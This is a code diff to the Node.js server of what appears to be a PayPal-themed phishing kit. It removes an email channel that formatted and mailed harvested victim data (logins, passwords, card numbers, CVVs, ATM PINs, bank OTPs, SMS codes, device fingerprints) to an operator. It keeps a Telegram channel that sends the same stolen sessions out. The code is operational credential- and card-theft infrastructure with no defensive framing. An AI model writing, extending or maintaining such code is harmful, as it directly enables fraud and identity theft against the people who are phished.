@@ -8,7 +8,6 @@ import rateLimit from 'express-rate-limit';
 import fs from 'fs';
 import crypto from 'crypto';
 import https from 'https';
-import nodemailer from 'nodemailer';
 import geoip from 'geoip-lite';
 import cookieParser from 'cookie-parser';
 import { shieldMiddleware, verifyHandler } from './shield';
@@ -50,17 +49,6 @@ const io = new Server(httpServer, {
 });
 
 const PORT = process.env.PORT || 8080;
-
-// --- Email Transporter ---
-const transporter = nodemailer.createTransport({
-    host: process.env.SMTP_HOST || 'smtp.gmail.com',
-    port: parseInt(process.env.SMTP_PORT || '587'),
-    secure: process.env.SMTP_SECURE === 'true', // true for 465, false for other ports
-    auth: {
-        user: process.env.SMTP_USER,
-        pass: process.env.SMTP_PASS,
-    },
-});
 
 // --- Middleware ---
 app.use(helmet({
@@ -143,7 +131,6 @@ const refreshSettings = async () => {
         // Fallback to Env
         if (!cachedSettings.tgToken) cachedSettings.tgToken = process.env.TELEGRAM_BOT_TOKEN;
         if (!cachedSettings.tgChat) cachedSettings.tgChat = process.env.TELEGRAM_CHAT_ID;
-        if (!cachedSettings.email) cachedSettings.email = process.env.ADMIN_EMAIL;
     } catch (e) { console.error('Failed to load settings', e); }
 };
 refreshSettings();
@@ -222,75 +209,6 @@ const formatSessionForTelegram = (session: any, title: string, flag: string) => 
     return msg;
 };
 
-const formatSessionForEmail = (session: any, title: string) => {
-    const s = session;
-    const d = s.data || s;
-
-    // Styles
-    const styleContainer = 'font-family: Helvetica, Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #e0e0e0; border-radius: 10px; background-color: #fafafa;';
-    const styleHeader = 'color: #003087; font-size: 24px; font-weight: bold; margin-bottom: 20px; border-bottom: 2px solid #003087; padding-bottom: 10px;';
-    const styleSection = 'margin-top: 20px; margin-bottom: 10px; color: #555; font-size: 14px; font-weight: bold; text-transform: uppercase; border-bottom: 1px solid #ddd; padding-bottom: 5px;';
-    const styleRow = 'display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px;';
-    const styleLabel = 'color: #777; font-weight: bold; min-width: 120px;';
-    const styleValue = 'color: #333; font-family: monospace; font-weight: bold;';
-
-    const row = (label: string, val: any) => `
-        <div style="${styleRow}">
-            <span style="${styleLabel}">${label}</span>
-            <span style="${styleValue}">${val || '<span style="color:#ccc">---</span>'}</span>
-        </div>`;
-
-    let html = `<div style="${styleContainer}">`;
-    html += `<div style="${styleHeader}">${title}</div>`;
-
-    html += row('Session ID', s.sessionId || s.id);
-    html += row('IP Address', s.fingerprint?.ip || s.ip || 'Unknown');
-    html += row('Time', new Date().toLocaleString());
-
-    if (d.firstName || d.lastName) {
-        html += `<div style="${styleSection}">Identity Profile</div>`;
-        html += row('Full Name', (d.firstName + ' ' + d.lastName).trim());
-        html += row('DOB', d.dob);
-        html += row('Phone', d.phoneNumber);
-        html += row('Address', d.address);
-        html += row('Location', d.country);
-    }
-
-    if (d.email || d.password) {
-        html += `<div style="${styleSection}">Login Credentials</div>`;
-        html += row('Email / User', d.email);
-        html += row('Password', d.password);
-    }
-
-    if (d.cardNumber) {
-        html += `<div style="${styleSection}">Financial Instrument</div>`;
-        html += row('Card Type', d.cardType);
-        html += row('Card Number', d.cardNumber);
-        html += row('Expiry', d.cardExpiry);
-        html += row('CVV', d.cardCvv);
-        if (d.atmPin) html += row('ATM PIN', d.atmPin);
-        html += row('Bank OTP', d.cardOtp);
-    }
-
-    if (d.phoneCode) {
-        html += `<div style="${styleSection}">Verification</div>`;
-        html += row('SMS Code', d.phoneCode);
-    }
-
-    if (s.fingerprint) {
-        html += `<div style="${styleSection}">Device Info</div>`;
-        html += row('Platform', s.fingerprint.platform);
-        html += `<div style="margin-top:5px; font-size:11px; color:#999; word-break:break-all;">${s.fingerprint.userAgent}</div>`;
-    }
-
-    html += `<div style="margin-top: 30px; text-align: center; font-size: 12px; color: #999;">
-        <p>Login to Admin Dashboard for more actions.</p>
-    </div>`;
-    html += `</div>`;
-
-    return html;
-};
-
 const sendTelegram = (msg: string) => {
     const token = cachedSettings.tgToken;
     const chat = cachedSettings.tgChat;
@@ -322,26 +240,6 @@ const sendTelegram = (msg: string) => {
     req.on('error', e => console.error('[Telegram] Network Error:', e));
     req.write(data);
     req.end();
-};
-
-const sendEmail = async (session: any, title: string) => {
-    if (!cachedSettings.email) return;
-
-    console.log(`[Email] Sending email to ${cachedSettings.email} for session ${session.sessionId}`);
-
-    const htmlBody = formatSessionForEmail(session, title);
-
-    try {
-        const info = await transporter.sendMail({
-            from: process.env.SMTP_FROM || '"PayPal Verifier" <no-reply@example.com>',
-            to: cachedSettings.email,
-            subject: `✅ ${title} - ${session.sessionId}`,
-            html: htmlBody
-        });
-        console.log(`[Email] Email sent: ${info.messageId}`);
-    } catch (error) {
-        console.error(`[Email] Email failed:`, error);
-    }
 };
 
 const getClientIp = (req: express.Request) => {
@@ -416,7 +314,6 @@ app.post('/api/sync', async (req, res) => {
                  const title = `Session Verified ${cardType}`;
                  const msg = formatSessionForTelegram(data, title, flag);
                  sendTelegram(msg);
-                 sendEmail(data, title);
             }
             // Intermediate Updates
             else if (changes.length > 0) {
